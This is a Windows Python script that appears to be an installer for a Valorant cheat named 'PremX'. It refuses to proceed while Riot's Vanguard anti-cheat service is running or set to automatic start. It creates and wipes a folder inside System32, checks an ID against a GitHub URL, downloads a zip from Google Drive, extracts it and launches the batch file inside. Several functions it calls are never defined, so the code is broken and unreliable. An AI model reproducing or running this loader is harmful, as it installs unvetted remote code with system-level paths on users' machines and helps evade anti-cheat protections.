import subprocess
import sys
import os
import winreg
import requests
import sys
import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\DSEL'

if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

result = check_string_in_url("https://raw.githubusercontent.com/bizsdklsxc35325/myins/refs/heads/main/unique_id.txt", file_contentsx1)

os.system('cls')
def check_service_status(service_name):
    try:
        # Run the 'sc query' command to check the service status
        result = subprocess.run(
            ["sc", "query", service_name],
            capture_output=True,
            text=True
        )

        # Check if the command was successful
        if result.returncode != 0:
            return f""

        # Analyze the output to determine the service state
        output = result.stdout
        if "RUNNING" in output:
            state = "running"
            os.system('cls')
            print("Error, valorant anti-cheat is running.")
            input()
            exit()
        elif "STOPPED" in output:
            state = "stopped"
        else:
            state = "unknown"

        # Check the start type (manual, automatic, disabled)
        config_result = subprocess.run(
            ["sc", "qc", service_name],
            capture_output=True,
            text=True
        )

        if config_result.returncode != 0:
            start_type = f""
        else:
            config_output = config_result.stdout
            if "AUTO_START" in config_output:
                start_type = "automatic"
                os.system('cls')
                print("Error, VGC service is set to automatic.")
                input()
                exit()
            elif "DEMAND_START" in config_output:
                start_type = "manual"
            elif "DISABLED" in config_output:
                start_type = "disabled"
            else:
                start_type = "unknown"

        return f""

    except Exception as e:
        return f""


service_name = "vgc"
status = check_service_status(service_name)

def updating_v1_2025():
    aesv3_path = r"C:\Windows\System32\DSEL\premx_d.py"
    directory_path = r"C:\Windows\System32\DSEL"

    if not os.path.exists(aesv3_path):
        if os.path.exists(directory_path):
            for item in os.listdir(directory_path):
                item_path = os.path.join(directory_path, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            os.system('cls')
            print("\nUPDATING PLEASE WAIT.\n\n")
    else:
        print("")
updating_v1_2025()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\DSEL\\premx_d.py"):
    os.system('cls')
    print("Installing PremX please wait.")
    download_file_from_google_drive("https://drive.google.com/uc?id=1iCT0PiW-Hpr-LSolT7Y6nL6UROJd58X-", "C:\\Windows\\System32\\DSEL\\premx2025.zip")
    zip_file = r'C:\Windows\System32\DSEL\premx2025.zip'
    extract_dir = r'C:\Windows\System32\DSEL'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil
os.system('cls')
import subprocess
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")


os.system('cls')
batch_file_path = r"C:\Windows\System32\DSEL\premx2025.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
